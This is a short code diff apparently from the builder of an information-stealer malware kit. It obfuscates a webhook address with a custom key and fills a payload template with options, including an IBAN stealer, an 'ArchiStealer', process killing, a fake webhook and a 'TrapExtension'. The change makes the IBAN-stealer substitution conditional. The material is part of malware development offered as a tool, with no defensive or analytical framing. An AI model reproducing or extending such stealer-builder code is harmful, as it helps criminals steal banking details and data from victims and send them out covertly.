@@ -203,6 +203,8 @@ while True:
     Webhook = obf(Webhook.encode(), custom_key)
     new_content = content.replace("'%Webhook%'", f'{str(Webhook)}' + ',' + f'{str(custom_key)}')
     new_content = new_content.replace("'%Debug%'", str(Debug))
+    if Iban_Stealer == True:
+        new_content = new_content.replace("'%IbanStealer%'", str(Iban_Stealer))
     new_content = new_content.replace("'%FakeWebhook%'", str(FakeWeb))
     new_content = new_content.replace("'%Schedule%'", str(Schedule))
     new_content = new_content.replace("'%FakeGen%'", str(FakeGen))
@@ -223,7 +225,6 @@ while True:
     new_content = new_content.replace("'%Drive%'", str(Drive))
     new_content = new_content.replace("'%CloseProc%'", str(Kill_process))
     new_content = new_content.replace("'%ArchiStealer%'", str(ArchiStealer))
-    new_content = new_content.replace("'%IbanStealer%'", str(Iban_Stealer))
     new_content = new_content.replace("'%TrapExtension%'", str(Trap_Extension))
 
     
